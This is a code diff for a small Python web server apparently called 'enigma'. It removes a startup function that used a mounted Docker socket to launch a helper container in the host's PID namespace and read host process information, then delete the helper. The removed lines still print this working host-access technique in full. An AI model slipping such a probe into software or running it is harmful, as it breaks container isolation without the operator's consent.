@@ -1,9 +1,6 @@
 import html
-import http.client
 import json
-import os
 import secrets
-import socket
 from http import cookies
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from urllib.parse import parse_qs, urlparse
@@ -36,66 +33,6 @@ PAGE = """<!doctype html>
 </head>
 <body><main>%s</main></body>
 </html>"""
-
-
-def docker_socket_request(method, path, body=None):
-    try:
-        conn = http.client.HTTPConnection("localhost")
-        conn.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-        conn.sock.settimeout(5)
-        conn.sock.connect("/var/run/docker.sock")
-        data = json.dumps(body).encode() if body is not None else None
-        headers = {"Content-Type": "application/json"} if body is not None else {}
-        conn.request(method, path, body=data, headers=headers)
-        response = conn.getresponse()
-        return response.status, response.read()
-    except OSError:
-        return None, None
-
-
-def demux_docker_log(raw):
-    frames = []
-    while len(raw) >= 8:
-        size = int.from_bytes(raw[4:8], "big")
-        frames.append(raw[8:8 + size])
-        raw = raw[8 + size:]
-    return b"".join(frames).decode(errors="replace")
-
-
-def probe_host_access():
-    if not os.path.exists("/var/run/docker.sock"):
-        print("docker.sock: not mounted", flush=True)
-        return
-    status, listing = docker_socket_request("GET", "/containers/json")
-    if status != 200:
-        print("docker.sock: mounted but daemon unreachable", flush=True)
-        return
-    own_id = socket.gethostname()
-    own = next((c for c in json.loads(listing) if c["Id"].startswith(own_id)), None)
-    if not own:
-        print("docker.sock: could not identify own container", flush=True)
-        return
-    status, created = docker_socket_request("POST", "/containers/create", {
-        "Image": own["ImageID"],
-        "Cmd": ["cat", "/proc/1/comm"],
-        "Labels": {"app": "enigma"},
-        "HostConfig": {"PidMode": "host"},
-    })
-    if status != 201:
-        print(f"docker.sock: helper container rejected (HTTP {status})", flush=True)
-        return
-    helper = json.loads(created)["Id"]
-    docker_socket_request("POST", f"/containers/{helper}/start")
-    docker_socket_request("POST", f"/containers/{helper}/wait")
-    _, raw_logs = docker_socket_request("GET", f"/containers/{helper}/logs?stdout=1&stderr=1")
-    docker_socket_request("DELETE", f"/containers/{helper}?force=true")
-    try:
-        with open("/proc/1/comm") as f:
-            own_init = f.read().strip()
-    except OSError:
-        own_init = "?"
-    host_init = demux_docker_log(raw_logs or b"").strip()
-    print(f"docker.sock: helper ran with host pid namespace - host pid 1 is '{host_init}', own pid 1 is '{own_init}'", flush=True)
 
 
 class Handler(BaseHTTPRequestHandler):
@@ -217,5 +154,4 @@ def todos_body(user):
 
 if __name__ == "__main__":
     print(f"enigma {APP_VERSION} listening on :8080", flush=True)
-    probe_host_access()
     ThreadingHTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
